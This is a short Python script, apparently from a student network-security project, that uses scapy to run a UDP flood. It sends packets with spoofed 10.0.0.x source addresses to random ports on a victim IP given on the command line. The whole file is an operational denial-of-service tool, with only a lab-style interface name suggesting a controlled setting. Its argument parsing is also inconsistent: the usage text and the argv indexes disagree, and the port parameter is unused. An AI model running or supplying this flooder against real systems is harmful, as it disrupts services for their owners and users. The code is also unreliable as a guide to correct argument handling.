#!/usr/bin/env python3
"""
Generador de ataques UDP Flood
Proyecto RSE 2025
"""

import sys
import time
from scapy.all import IP, UDP, send, RandShort

def udp_flood(target_ip, target_port=None, num_packets=100, interval=0.005):
    print(f"[*] Iniciando UDP Flood contra {target_ip}")
    
    for i in range(num_packets):
        ip = IP(
            src=f"10.0.0.{(i % 250) + 4}",
            dst=target_ip
        )
        # Enviamos a puertos aleatorios para maximizar el impacto
        udp = UDP(
            sport=RandShort(),
            dport=RandShort() 
        )
        
        packet = ip / udp
        send(packet, iface="atacante-eth0", verbose=0)
        
        if (i + 1) % 50 == 0:
            print(f"[+] Enviados {i + 1}/{num_packets} paquetes")
        
        time.sleep(interval)
    
    print(f"[✓] Ataque completado")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Uso: python3 udp_flood.py <IP_victima> [num_paquetes] [intervalo]")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if (len(sys.argv) > 2 and sys.argv[2] != '0') else None
    packets = int(sys.argv[3]) if len(sys.argv) > 2 else 500
    interval = float(sys.argv[4]) if len(sys.argv) > 3 else 0.005
    
    try:
        udp_flood(target, port, packets, interval)
    except KeyboardInterrupt:
        print("\n[!] Interrumpido")